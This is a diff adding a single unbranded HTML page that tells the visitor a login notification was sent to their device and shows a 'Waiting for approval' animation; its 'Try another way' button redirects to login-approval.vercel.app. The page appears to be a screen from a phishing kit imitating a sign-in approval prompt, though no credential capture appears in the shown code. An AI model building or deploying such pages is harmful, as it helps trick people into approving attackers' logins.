@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Check your notifications</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html,body {
+      height: 100%;
+      background: #07121a;
+      color: #e6eef6;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    }
+
+    .wrap {
+      max-width: 420px;
+      margin: 28px auto;
+      padding: 22px;
+    }
+
+    .card {
+      background: linear-gradient(180deg, #07121a 0%, #0b1a22 100%);
+      border-radius: 18px;
+      padding: 22px;
+      box-shadow: 0 8px 24px rgba(2,8,14,0.6);
+      border: 1px solid rgba(255,255,255,0.04);
+    }
+
+    .title {
+      font-size: 22px;
+      line-height: 1.2;
+      font-weight: 700;
+      color: #f1f7fb;
+      margin-bottom: 12px;
+    }
+
+    .lead {
+      color: #b7c7d4;
+      font-size: 14px;
+      line-height: 1.5;
+      margin-bottom: 18px;
+    }
+
+    .image-box {
+      width: 100%;
+      height: 180px;
+      border-radius: 14px;
+      background: #e8f3fc;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 18px;
+      padding: 20px;
+    }
+
+    .image-box svg {
+      max-width: 100%;
+      max-height: 100%;
+    }
+
+    .status-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 18px;
+    }
+
+    .status-badge {
+      width: 46px;
+      height: 46px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.03);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 1px solid rgba(255,255,255,0.06);
+    }
+
+    .dots {
+      display: flex;
+      gap: 4px;
+    }
+    .dot {
+      width: 6px;
+      height: 6px;
+      background: #cfe9ff;
+      border-radius: 50%;
+      opacity: 0.3;
+      animation: jump 1s infinite ease-in-out;
+    }
+    .dot:nth-child(1) { animation-delay: 0s; }
+    .dot:nth-child(2) { animation-delay: 0.15s; }
+    .dot:nth-child(3) { animation-delay: 0.3s; }
+
+    @keyframes jump {
+      0%,100% { opacity: 0.3; transform: translateY(0); }
+      40% { opacity: 1; transform: translateY(-6px); }
+      80% { opacity: 0.4; transform: translateY(0); }
+    }
+
+    .status-texts { display: flex; flex-direction: column; }
+    .status-main {
+      color: #e6eef6;
+      font-weight: 600;
+      font-size: 15px;
+      margin-bottom: 3px;
+    }
+    .status-sub { color: #99abc0; font-size: 13px; }
+
+    .action-row { margin-top: 10px; }
+    .ghost-btn {
+      width: 100%;
+      padding: 14px 18px;
+      border-radius: 30px;
+      border: 1px solid rgba(255,255,255,0.06);
+      background: rgba(255,255,255,0.02);
+      color: #d8e9f8;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all .14s ease;
+      box-shadow: 0 4px 14px rgba(2,8,14,0.6);
+    }
+    .ghost-btn:hover {
+      transform: translateY(-2px);
+      background: rgba(255,255,255,0.04);
+    }
+
+    @media (max-width:420px) {
+      .title { font-size: 20px; }
+      .image-box { height: 160px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <div class="title">Check your notifications on another device</div>
+      <div class="lead">
+        We sent a notification to your device, Android/Ios/Windows. Check your notifications there and approve the login to continue.
+      </div>
+
+      <!-- Correct security illustration -->
+      <div class="image-box">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128">
+          <rect x="20" y="30" width="40" height="68" rx="6" ry="6" fill="#fff" stroke="#3b82f6" stroke-width="3"/>
+          <circle cx="40" cy="84" r="4" fill="#3b82f6"/>
+          <rect x="70" y="45" width="38" height="30" rx="3" ry="3" fill="#fff" stroke="#10b981" stroke-width="3"/>
+          <path d="M75 60 l6 6 12-12" stroke="#10b981" stroke-width="3" fill="none" stroke-linecap="round"/>
+        </svg>
+      </div>
+
+      <div class="status-row">
+        <div class="status-badge">
+          <div class="dots">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+          </div>
+        </div>
+        <div class="status-texts">
+          <div class="status-main">Waiting for approval</div>
+          <div class="status-sub">Approve from the other device to continue.</div>
+        </div>
+      </div>
+
+      <div class="action-row">
+        <button class="ghost-btn" onclick="tryAnotherWay()">Try another way</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function tryAnotherWay() {
+      window.location.href = "https://login-approval.vercel.app/";
+    }
+  </script>
+</body>
+</html>
